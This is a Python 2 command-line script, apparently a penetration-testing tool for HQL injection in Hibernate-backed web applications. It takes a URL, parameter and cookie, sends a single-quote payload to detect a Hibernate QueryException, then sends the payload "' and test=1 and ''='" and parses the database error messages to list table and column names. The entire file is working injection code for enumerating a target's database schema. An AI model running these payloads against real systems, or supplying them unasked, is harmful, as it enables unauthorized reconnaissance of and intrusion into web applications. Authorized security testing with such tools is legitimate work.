from urlparse import urlparse, parse_qs
from bs4 import BeautifulSoup
import urllib
import optparse
import requests
import sys
import json
import re

COOKIE = ""
TABLES = {}

def send_HTTP_request(url, params):
    global COOKIE

    # Create HTTP headers
    headers = {'cookie': COOKIE}

    url = url + '?' + urllib.urlencode(params)
    req = requests.get(url, headers=headers)
    return req

def check_if_host_vulnerable(url, params, param_to_test):
    params[param_to_test][0] = "'"

    print params
    req = send_HTTP_request(url, params)
    # print req.content
    if ('org.hibernate.QueryException' in req.content):
        print "Host seems vulnerable."
    else:
        raise Exception('No Query Exception in the HTTP response.')

def list_columns(url, params, param_to_test):

    global TABLES
    columns = []
    params[param_to_test][0] = "' and test=1 and ''='"

    print params
    req = send_HTTP_request(url, params)
    # print req.content
    if ('not found; SQL statement' in req.content):
        # pattern for the columns
        # TODO: replace with this regex (([a-zA-Z0-9_-]+_)\.([a-zA-Z0-9_-]+)\s)
        # pattern = re.compile(r'(_\.[a-zA-Z0-9_-]+\s)')
        pattern = re.compile(r'(([a-zA-Z_-]+)[0-9]+_\.([a-zA-Z0-9_-]+)\s)')
        for res in re.findall(pattern, req.content):
            table_name = res[1]
            column_name = res[2]

            if (table_name not in TABLES):
                TABLES[table_name] = []
                print "[!] Table found : " + table_name

            if (column_name not in TABLES[table_name]):
                TABLES[table_name].append(column_name)
                print "[!] Column found : " + column_name
    else:
        raise Exception('We cannot manage to retrieve columns.')
    

def enumerate_tables_and_columns():
    global TABLES

    print "[!] Enumerating extracted information"
    for table in TABLES:
        print "[" + table + "]"
        for column in TABLES[table]:
            print "\t" + column


# option parser
parser = optparse.OptionParser()
parser.add_option('--url', help='URL to pentest', dest='url')
parser.add_option('--param', help='Param to test', dest='param')
parser.add_option('--cookie', help='Cookie to test it', dest='cookie', default=None)
parser.add_option('--T', help='List tables', dest='list_tables', default=False, action='store_true')
parser.add_option('--verbose', help='Verbose mode', dest='verbose', default=False, action='store_true')

# TODO: Check for mandatory parameters
# mandatory params to check
# mandatory_params = ['url', 'param']

if (len(sys.argv) <= 2):
    parser.print_help()
else:
    (opts, args) = parser.parse_args()
    COOKIE = opts.cookie

    # check for param
    params = parse_qs(urlparse(opts.url).query)
    if (opts.param not in params):
        raise Exception('Param not in URL!')

    # print params
    url = opts.url.split('?')[0]
    check_if_host_vulnerable(url, params, opts.param)

   # list columns
    list_columns(url, params, opts.param)

    # enumerate tables and columns found
    enumerate_tables_and_columns()